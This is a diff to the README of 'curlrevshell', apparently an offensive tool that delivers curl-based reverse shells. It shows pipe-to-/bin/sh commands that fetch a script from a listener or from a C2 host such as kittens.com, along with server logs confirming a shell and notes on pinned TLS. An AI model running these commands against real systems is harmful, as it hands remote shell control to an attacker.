@@ -48,7 +48,7 @@ $ curlrevshell
 
 curl -sk --pinnedpubkey sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY= https://192.168.1.10:4444/c | /bin/sh
 
-01:04:55.247 [192.168.1.20] Sent script: ID:zcj5vz3zp6ce URL:192.168.1.10:4444
+01:04:55.247 [192.168.1.20] Sent script: ID:zcj5vz3zp6ce URL:192.168.1.10:4444 Path:/c
 01:04:55.259 [192.168.1.20] Input connected: ID:1jns1whwi1p1q
 01:04:55.259 [192.168.1.20] Output connected: ID:1jns1whwi1p1q
 01:04:55.259 [192.168.1.20] Shell is ready to go!
@@ -154,13 +154,14 @@ curl -sk --pinnedpubkey sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY= htt
 ```
 The `curl` command in the script:
 ```sh
-curl -Nsk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://kittens.com/i/1upal29kpq9g7 </dev/null 2>&0 |
+curl -sk --pinnedpubkey sha256//pSUroiq0g92Z3m08n7g/zPQyspRyjm2x/enFRndcdL0= https://kittens.com/i/1upal29kpq9g7 -N  </dev/null 2>&0 |
 ```
-With `?c2=kittens.com` it would have been `https://192.168.1.10:4444` instead.
+Without `?c2=kittens.com` it would have been `https://192.168.1.10:4444`
+instead.
 
 The server also tells us that the script was generated for `kittens.com`:
 ```
-22:08:20.488 [192.168.1.20] Sent script: ID:1upal29kpq9g7 URL:kittens.com
+22:08:20.488 [192.168.1.20] Sent script: ID:1upal29kpq9g7 URL:kittens.com:443 Path:/c
 ```
 
 ### As a header
@@ -171,19 +172,19 @@ curl -Hc2:kittens.com:22 -sk --pinnedpubkey sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B
 ```
 Weird flex, but it worked.
 ```sh
-curl -Nsk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://kittens.com:22/i/2v0ohzqf5kw1t </dev/null 2>&0 |
+curl -sk --pinnedpubkey sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY= https://kittens.com:22/i/2v0ohzqf5kw1t -N  </dev/null 2>&0 |
 ```
 Server agrees
 ```
-22:14:13.902 [192.168.1.20] Sent script: ID:2v0ohzqf5kw1t URL:kittens.com:22
+22:14:13.902 [192.168.1.20] Sent script: ID:2v0ohzqf5kw1t URL:kittens.com:22 Path:/c
 ```
 
 TLS
 ---
 TLS is all via a pinned self-signed certificate.  By default, the certificate
 is cached in a file, mostly to keep from having to copy/paste a new fingerprint
-every time a ragey Ctrl+C kills the current shell.  Caching can be disabled
-with `-tls-certificate-cache ""`.
+every time a few ragey Ctrl+C's kill the current shell.  Caching can be
+disabled with `-tls-certificate-cache ""`.
 
 File Insertion
 --------------
